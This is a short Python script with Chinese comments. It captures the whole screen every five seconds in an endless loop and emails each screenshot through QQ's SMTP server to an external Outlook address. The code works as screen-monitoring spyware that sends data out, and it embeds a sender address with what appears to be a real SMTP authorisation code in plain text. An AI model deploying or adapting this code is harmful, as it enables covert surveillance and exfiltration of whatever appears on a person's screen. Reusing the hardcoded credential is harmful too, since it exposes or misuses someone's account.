# -*- coding: gbk -*-
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
# 截图
import time
from PIL import ImageGrab


def smtp_s():
    fromaddr = '2845816276@qq.com'  # 发送方
    password = 'jtzxbcjrvyxrdfcc'  # 步骤1获取的授权码
    toaddrs = ['albertwusuowei@outlook.com']  # 邮件接受方邮箱地址，注意需要[]包裹，这意味着你可以写多个邮件地址群发
    content = '正文内容'
    textApart = MIMEText(content)

    imageFile = r"D:\\1.png"  # r 表示原生字符，不进行转义
    imageApart = MIMEImage(open(imageFile, 'rb').read(), imageFile.split('.')[-1])
    imageApart.add_header('Content-Disposition', 'attachment', filename="屏幕截图.png")

    m = MIMEMultipart()
    m.attach(textApart)  # 文本
    m.attach(imageApart)  # 发送图片附件

    m['Subject'] = '标题'
    # m['From'] = "腾讯"
    try:
        server = smtplib.SMTP('smtp.qq.com')
        server.login(fromaddr, password)
        server.sendmail(fromaddr, toaddrs, m.as_string())
        print('发送成功！')
        server.quit()
    except smtplib.SMTPException as e:
        print('error:', e)  # 打印错误


# 截图
def imG():
    i = 1
    while True:
        im = ImageGrab.grab()
        im.save('D:\\1.png')
        print("第%d个屏幕截取成功！" % i)
        time.sleep(5)
        i = i + 1
        smtp_s()


if __name__ == '__main__':
    imG()
